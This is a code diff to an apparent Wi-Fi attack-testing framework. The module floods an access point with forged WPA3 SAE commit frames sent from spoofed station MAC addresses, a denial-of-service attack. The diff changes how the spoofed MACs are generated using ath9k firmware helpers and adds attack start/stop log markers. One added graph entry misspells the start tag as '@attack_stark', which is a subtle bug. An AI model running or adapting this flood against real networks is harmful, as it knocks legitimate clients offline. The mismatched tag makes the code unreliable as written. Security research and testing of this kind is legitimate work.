@@ -12,6 +12,7 @@
 #include "logger/log.h"
 #include "observer/resource_checker.h"
 #include "system/hw_capabilities.h"
+#include "system/firmware/ath9k_htc.h"
 
 using namespace std;
 using namespace Tins;
@@ -23,6 +24,7 @@ static constexpr size_t N_DH_GROUPS = size(DH_GROUPS);
 
 static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size, const bool use_connected_stas){
 	vector<HWAddress<6>> pool;
+	const auto attacker_mac = rs.get_actor("attacker").get(SK::mac);
 	if(use_connected_stas){
 		pool = dos_helpers::get_connected_stas(rs);
 		pool.resize(min(static_cast<int>(pool.size()), pool_size));
@@ -30,7 +32,7 @@ static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size, c
 		if(static_cast<int>(pool.size()) < pool_size){
 			log(LogLevel::WARNING, "Only {} connected STAs available (need {}), padding with random MACs", pool.size(),
 				pool_size);
-			while(static_cast<int>(pool.size()) < pool_size) pool.emplace_back(hw_capabilities::rand_mac());
+			while(static_cast<int>(pool.size()) < pool_size) pool.emplace_back(firmware::get_random_ath_masker_mac(attacker_mac));
 		} else{
 			log(LogLevel::INFO, "Using {} connected STA MACs", pool_size);
 		}
@@ -38,7 +40,7 @@ static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size, c
 	}
 
 	pool.reserve(pool_size);
-	for(int i = 0; i < pool_size; ++i) pool.emplace_back(hw_capabilities::rand_mac());
+	for(int i = 0; i < pool_size; ++i) pool.emplace_back(firmware::get_random_ath_masker_mac(attacker_mac));
 	log(LogLevel::INFO, "Using {} random MACs", pool_size);
 	return pool;
 }
@@ -80,6 +82,7 @@ void run_attack(RunStatus &rs){
 	log(LogLevel::INFO, "Attack started");
 
 	size_t mac_idx = 0;
+	rs.process_manager.write_log_all("@attack_start");
 	dos_helpers::timed_burst(sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL,
 							[&]() ->optional<RadioTap>{
 								const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
@@ -87,7 +90,7 @@ void run_attack(RunStatus &rs){
 								sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
 								return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
 							});
-
+	rs.process_manager.write_log_all("@attack_stop");
 	ap->conn->disconnect();
 }
 
@@ -98,6 +101,7 @@ void stats_attack(const RunStatus &rs){
 					{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
 					{"access_point", "EAPOL-4WAY-HS-COMPLETED", "4Way", "green"},
 					{"client", START_tag, "START", "black"}, {"client", END_tag, "END", "black"},
+					{"client", "@attack_stark", "attack_start", "black"}, {"client", "@attack_stop", "attack_stop", "black"},
 				});
 	observer::resource_checker::create_graph(rs, rs.get_actor("access_point").get(SK::source), elements);
 }
